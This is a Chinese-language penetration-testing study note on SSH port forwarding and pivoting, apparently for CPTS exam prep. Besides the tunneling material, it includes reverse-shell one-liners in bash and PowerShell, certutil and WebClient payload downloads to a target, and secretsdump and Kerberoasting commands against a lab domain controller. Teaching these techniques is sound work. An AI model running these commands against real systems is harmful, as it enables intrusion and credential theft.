# 第 65 章 - SSH 埠轉發

## 標籤

- #cpts
- #chapter
- #ssh
- #pivoting

## 學習目標

- 理解 Local / Remote / Dynamic 三種 SSH 轉發的底層原理，知道封包是怎麼走的。
- 能依照情況判斷要用哪種模式，不是死背指令。
- 掌握 ProxyJump 多跳的設定。
- 知道每個 option 的作用，能在出問題時自行調整。

---

## 理論基礎：SSH 轉發為什麼能 Pivot

SSH 本身就是一條加密隧道（Tunnel）。當你 SSH 連到跳板機時，這條隧道不只能傳指令，還能承載其他 TCP 連線的流量。SSH 埠轉發就是把這個隧道當成「管道」，把封包從一端塞進去，從另一端出來，讓你繞過網路邊界。

```
你（Kali） ←── 加密 SSH 隧道 ──→ 跳板機（Pivot）
                                        │
                                   內網目標主機
```

關鍵前提：
- 你能 SSH 到跳板機（有帳號/key）
- 跳板機能到達你想存取的內網目標
- 不需要在目標機上安裝任何東西

---

## 三種模式的核心差異

| 模式 | 誰發起連線 | 流量方向 | 典型使用場景 |
|------|----------|---------|------------|
| Local (-L) | 你（Kali）發起 | Kali → 跳板 → 目標 | 存取內網某個服務（RDP、Web、SMB） |
| Remote (-R) | 跳板機發起 | 目標 → 跳板 → Kali | 接 reverse shell、讓跳板機「幫你」開放服務 |
| Dynamic (-D) | Kali 開 SOCKS | Kali → 跳板 → 任何目標 | 掃整個內網、跑多種工具 |

---

## 一、Local Port Forward（-L）

### 原理

你在 Kali 本機開一個 port，凡是連到這個 port 的流量，SSH 都會透過隧道轉送到你指定的遠端地址。

```
你連 127.0.0.1:13389
  → SSH 隧道
    → 跳板機幫你連 172.16.139.35:3389
```

跳板機在這裡是「代理人」，幫你去連你連不到的目標。

### 指令結構

```bash
ssh -L [本地綁定IP:]本地PORT:目標IP:目標PORT [選項] user@跳板機IP
```

**各欄位說明：**

- `本地綁定IP`（可省略）：省略時預設是 `127.0.0.1`，只有你自己的 Kali 可以用。若寫 `0.0.0.0` 則整個網段都能連進來（少見，通常不需要）
- `本地PORT`：你在 Kali 上開的 port，自己隨便取，不要跟現有服務衝突
- `目標IP`：你要到達的內網主機 IP，從跳板機的角度去看（不是你的角度）
- `目標PORT`：目標主機上的服務 port

**常用選項：**

| 選項 | 作用 | 說明 |
|------|------|------|
| `-N` | 不執行任何指令 | 純轉發用，不開 shell，讓隧道乾淨 |
| `-f` | 背景執行 | SSH 連線進背景，終端可以繼續用 |
| `-p PORT` | 指定 SSH port | 跳板機的 SSH 不在 22 時使用 |
| `-i /path/key` | 使用 private key 認證 | 沒有密碼時用 key 登入 |
| `-o StrictHostKeyChecking=no` | 跳過 host key 驗證 | 快速測試用，避免第一次連線被擋住 |
| `-o ServerAliveInterval=30` | 每 30 秒送一個 keepalive | 防止 SSH 靜默斷線 |
| `-o ServerAliveCountMax=3` | 最多重試 3 次後才斷線 | 搭配上面用 |

### 場景一：內網 RDP

```bash
# 情境：
# Kali → 可以 SSH 到 DMZ01(10.129.10.5)
# DMZ01 → 可以連到 172.16.139.35:3389（內網 SRV01 的 RDP）
# Kali → 直接連 172.16.139.35 失敗（不通）

# 解法：把 SRV01 的 RDP 透過 DMZ01 轉發到 Kali localhost:13389
ssh -L 13389:172.16.139.35:3389 user@10.129.10.5 -N -f

# 為什麼選 13389 而不是 3389？
# 因為你的 Kali 本機可能已經有東西在聽 3389，換一個 port 避免衝突

# 確認 port 有在監聽
ss -tnlp | grep 13389

# 連線
xfreerdp /v:127.0.0.1:13389 /u:Administrator /p:'Password123!' /dynamic-resolution /drive:share,/tmp
# /v:127.0.0.1:13389  → 連到 Kali 本機，SSH 隧道幫你轉
# /dynamic-resolution → 自動調整解析度
# /drive:share,/tmp   → 把 Kali 的 /tmp 掛到 RDP session 裡（方便傳檔案）
```

### 場景二：內網 WinRM（evil-winrm）

```bash
# 把 172.16.139.35:5985 轉到 Kali localhost:15985
ssh -L 15985:172.16.139.35:5985 user@10.129.10.5 -N -f

# 連線
evil-winrm -i 127.0.0.1 -P 15985 -u Administrator -p 'Password123!'
# -i 127.0.0.1   → 連本機
# -P 15985       → 轉發後的 port
```

### 場景三：同時轉發多個服務

```bash
# 一條 SSH 指令可以同時開多個 -L
ssh user@10.129.10.5 -N -f \
  -L 13389:172.16.139.35:3389 \
  -L 15985:172.16.139.35:5985 \
  -L 4445:172.16.139.3:445

# 為什麼這樣做？
# 考試中你可能同時需要 RDP、WinRM、SMB 三個服務
# 一條指令比開三個 SSH session 更乾淨
```

---

## 二、Remote Port Forward（-R）

### 原理

和 Local 相反。你在跳板機（遠端）開一個 port，凡是連到跳板機那個 port 的流量，SSH 都會透過隧道傳回你的 Kali。

```
目標機打 reverse shell 到 跳板機:4444
  → SSH 隧道
    → 流量轉到 Kali:4444
      → 你的 nc 接到了
```

### 指令結構

```bash
ssh -R [跳板機綁定IP:]跳板機PORT:本地IP:本地PORT [選項] user@跳板機IP
```

**各欄位說明：**

- `跳板機綁定IP`（可省略）：省略時預設 `127.0.0.1`，也就是只有跳板機自己可以用。若要讓同網段的其他機器連過來，改成 `0.0.0.0`（但需要 sshd 設定 `GatewayPorts yes`）
- `跳板機PORT`：跳板機上開的 port，目標機要連的地方
- `本地IP`：你 Kali 上要接收的 IP，通常是 `127.0.0.1`
- `本地PORT`：你 Kali 上 nc 在聽的 port

### 場景一：接收 Reverse Shell

```bash
# 步驟 1：Kali 先開監聽
nc -lvnp 4444
# -l  → 監聽模式（listen）
# -v  → verbose，看連線訊息
# -n  → 不做 DNS 解析（快）
# -p  → 指定 port

# 步驟 2：把跳板機的 4444 → Kali 的 4444
ssh -R 4444:127.0.0.1:4444 user@10.129.10.5 -N -f

# 步驟 3：在目標機上執行 reverse shell（連到跳板機 IP）
# 目標機（Windows）：
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.129.10.5',4444);..."
# 目標機（Linux）：
bash -i >& /dev/tcp/10.129.10.5/4444 0>&1

# 流量走向：目標機 → 跳板機:4444 → Kali nc:4444
```

### 場景二：讓內網機器能下載你的工具

```bash
# 情境：
# 你想讓 172.16.139.35（SRV01）下載 Kali 上的工具
# SRV01 → DMZ01 可通，DMZ01 → Kali 可通

# 步驟 1：Kali 開 HTTP server
python3 -m http.server 8080

# 步驟 2：把跳板機的 8080 → Kali 的 8080
ssh -R 8080:127.0.0.1:8080 user@10.129.10.5 -N -f

# 步驟 3：SRV01 從跳板機下載
# PowerShell：
(New-Object Net.WebClient).DownloadFile('http://10.129.10.5:8080/tool.exe','C:\Windows\Temp\tool.exe')
# certutil：
certutil -urlcache -f http://10.129.10.5:8080/tool.exe C:\Windows\Temp\tool.exe
```

### 注意：GatewayPorts

預設情況下，`-R` 開的 port 只有跳板機 `localhost` 能用（`127.0.0.1`）。如果你要讓整個內網都能連到跳板機的那個 port，跳板機的 SSH 設定要改：

```bash
# 跳板機上（需要 root）
echo "GatewayPorts yes" >> /etc/ssh/sshd_config
systemctl restart sshd

# 然後用 0.0.0.0 綁定
ssh -R 0.0.0.0:4444:127.0.0.1:4444 user@10.129.10.5 -N -f
```

---

## 三、Dynamic Port Forward（-D）SOCKS5

### 原理

開一個 SOCKS5 代理。你的工具把流量送到這個代理，代理透過 SSH 隧道讓跳板機幫你轉發到任意目標。

```
Kali 工具 → SOCKS5(localhost:1080) → SSH 隧道 → 跳板機 → 任意內網主機
```

**和 -L 的差異：**
- `-L` 是固定轉發到一個目標（一個 IP + 一個 port）
- `-D` 是動態的，可以連到跳板機能到的任何地方

### 指令

```bash
ssh -D 1080 user@10.129.10.5 -N -f
# -D 1080  → 在 Kali localhost:1080 開 SOCKS5 代理
# -N       → 不開 shell，純轉發
# -f       → 背景執行
```

### proxychains 設定

```bash
# 編輯設定檔
sudo nano /etc/proxychains4.conf

# 找到最後的 proxy 設定區塊，改成：
[ProxyList]
socks5 127.0.0.1 1080

# 注意：proxychains4.conf 和 proxychains.conf 是不同檔案
# 確認你用的是哪個：which proxychains4
```

### 工具搭配

```bash
# nxc 掃整段網路
proxychains4 nxc smb 172.16.139.0/24
proxychains4 nxc smb 172.16.139.3 -u Administrator -p 'Password123!'

# nmap（必須用 -sT，因為 proxychains 不支援 SYN scan）
proxychains4 nmap -sT -Pn -p 22,80,443,445,3389,5985 172.16.139.0/24
# -sT  → TCP Connect scan（完整三次握手，能透過 proxy）
# -Pn  → 不 ping，直接掃（proxy 環境下 ICMP 通常不通）

# evil-winrm
proxychains4 evil-winrm -i 172.16.139.35 -u Administrator -p 'Password123!'

# impacket
proxychains4 python3 /path/to/secretsdump.py DOMAIN/Administrator@172.16.139.3
proxychains4 python3 /path/to/GetUserSPNs.py DOMAIN/user:pass -dc-ip 172.16.139.3 -request
```

---

## 四、ProxyJump（-J）多跳 SSH

### 原理

讓 SSH 先連到中間跳板，再從跳板連到目標，整個過程是透明的，你的指令看起來像直接連到最終目標。

不需要先開隧道、不需要 proxychains，SSH 自己處理跳轉。

### 指令

```bash
# 基本語法
ssh -J user@跳板IP user@目標IP

# 帶 key
ssh -J user@10.129.10.5 -i ~/.ssh/id_rsa administrator@172.16.139.35

# 雙跳（兩個跳板，用逗號分隔）
ssh -J user@10.129.10.5,administrator@172.16.139.35 administrator@172.16.139.3
# 連線順序：Kali → DMZ01 → SRV01 → DC01
```

### 什麼時候用 ProxyJump 而不是 -L/-D？

| 場景 | 用 ProxyJump | 用 -L 或 -D |
|------|-------------|------------|
| 只需要 SSH 到內網主機 | ✅ 最簡單 | ❌ 多一個步驟 |
| 需要跑其他工具（nxc、evil-winrm） | ❌ 只能 SSH | ✅ 配合隧道 |
| 需要掃整個網段 | ❌ | ✅ 用 -D + proxychains |

### ~/.ssh/config 長期設定

當你在考試或長期作業中頻繁跳轉，可以用 config 檔避免每次打長指令：

```
# ~/.ssh/config

Host dmz01
    HostName 10.129.10.5
    User user
    Port 22
    IdentityFile ~/.ssh/id_rsa
    ServerAliveInterval 30
    ServerAliveCountMax 3

Host srv01
    HostName 172.16.139.35
    User administrator
    ProxyJump dmz01
    # 透過 dmz01 連

Host dc01
    HostName 172.16.139.3
    User administrator
    ProxyJump srv01
    # 透過 srv01 連（srv01 自己已透過 dmz01）
```

```bash
# 使用
ssh srv01           # 直接連 SRV01，SSH 自動跳轉
ssh dc01            # 直接連 DC01，SSH 自動兩跳
scp file.txt dc01:/tmp/  # 複製檔案也能用
```

---

## 五、維持連線（長時間作業）

考試期間隧道不能斷，否則全部工具都會失效。

```bash
# 建議的完整指令（帶 keepalive 和錯誤容忍）
ssh -D 1080 user@10.129.10.5 -N -f \
  -o ServerAliveInterval=30 \
  -o ServerAliveCountMax=3 \
  -o ExitOnForwardFailure=yes

# ServerAliveInterval=30  → 每 30 秒發一個 keepalive 封包
# ServerAliveCountMax=3   → 連續 3 次沒回應才斷線（總共等 90 秒）
# ExitOnForwardFailure=yes → 如果 port 綁定失敗，直接報錯而不是靜默失敗
```

```bash
# 在 tmux 裡跑（防止終端關掉就斷）
tmux new -s pivot
ssh -D 1080 user@10.129.10.5 -N \  # 不加 -f，直接在 tmux 跑
  -o ServerAliveInterval=30 \
  -o ServerAliveCountMax=3
# Ctrl+B, D → detach，隧道繼續跑
# tmux attach -t pivot → 回來看
```

---

## 六、何時用 SSH 轉發 vs Chisel vs Ligolo-ng

### 決策邏輯

```text
跳板機有 SSH 服務且你有帳號？
├── 是 → 優先用 SSH（不需要上傳工具）
│         ├── 只需要連 1-2 個服務 → ssh -L
│         ├── 需要掃整個網段或跑很多工具 → ssh -D + proxychains
│         └── 只需要 SSH 到更深層 → ssh -J
└── 否（跳板機是 Windows 或沒 SSH）
      ├── 快速單次 → Chisel
      └── 長時間、多工具、多網段 → Ligolo-ng
```

### 各工具的根本限制

**SSH 的限制：**
- 需要有 SSH 服務（port 22 或自訂 port）
- 需要有效憑證（帳號/密碼 或 key）
- proxychains + nmap 只能用 TCP connect scan，速度慢

**Chisel 的優勢：**
- 走 HTTP/WebSocket，容易穿過防火牆
- 不需要目標機的 SSH 服務
- Windows 跳板機也能用

**Ligolo-ng 的優勢：**
- 路由層級，工具不需要 proxychains
- nmap 可以直接跑 SYN scan
- 掃整個 /24 快得多

---

## 常見問題排查

| 現象 | 原因 | 解法 |
|------|------|------|
| `Connection refused` | SSH port 不是 22 | 加 `-p PORT` |
| `Bind: Address already in use` | 本機 port 被佔用 | 換一個本地 port（例如把 1080 改成 1081） |
| proxychains 連不到目標 | SOCKS port 設錯或沒開 | `ss -tnlp \| grep 1080` 確認 |
| nmap 掃不到結果 | 用了預設的 SYN scan | 加 `-sT`（TCP connect）和 `-Pn` |
| SSH 隧道無聲斷線 | 沒有 keepalive | 加 `-o ServerAliveInterval=30` |
| `Permission denied (publickey)` | 沒有 key 或路徑錯 | 加 `-i /path/to/key` |
| `-R` 開的 port 內網連不到 | GatewayPorts 預設關 | 跳板機的 sshd_config 加 `GatewayPorts yes` |
| SSH 背景執行後找不到怎麼關 | `-f` 放到背景了 | `ps aux \| grep ssh` 找 PID，`kill PID` |

---

## 速查表

```bash
# === Local（把遠端服務帶到本機）===
ssh -L 本地PORT:目標IP:目標PORT user@跳板IP -N -f

# 範例：存取內網 RDP
ssh -L 13389:172.16.139.35:3389 user@10.129.10.5 -N -f
xfreerdp /v:127.0.0.1:13389 /u:Administrator /p:'Password!'

# === Remote（接 reverse shell）===
nc -lvnp 4444
ssh -R 4444:127.0.0.1:4444 user@10.129.10.5 -N -f
# → 目標機的 shell 打到跳板機:4444，轉到 Kali:4444

# === Dynamic（整個內網 SOCKS）===
ssh -D 1080 user@10.129.10.5 -N -f
# proxychains4.conf: socks5 127.0.0.1 1080
proxychains4 nxc smb 172.16.139.0/24
proxychains4 nmap -sT -Pn -p 445,3389,5985 172.16.139.3

# === ProxyJump（SSH 多跳）===
ssh -J user@10.129.10.5 administrator@172.16.139.35
ssh -J user@10.129.10.5,administrator@172.16.139.35 administrator@172.16.139.3

# === 多 port 同時轉發 ===
ssh user@10.129.10.5 -N -f \
  -L 13389:172.16.139.35:3389 \
  -L 15985:172.16.139.35:5985 \
  -o ServerAliveInterval=30
```

## 關聯筆記

- [[64-網路路由基礎|第 64 章 - 網路路由基礎]]
- [[66-Chisel|第 66 章 - Chisel]]
- [[67-Ligolo-ng|第 67 章 - Ligolo-ng]]
- [[69-多跳Pivoting|第 69 章 - 多跳 Pivoting]]
- [[08-Volume-8-Pivoting-Index|Vol.8 - Pivoting, Tunneling and Port Forwarding]]
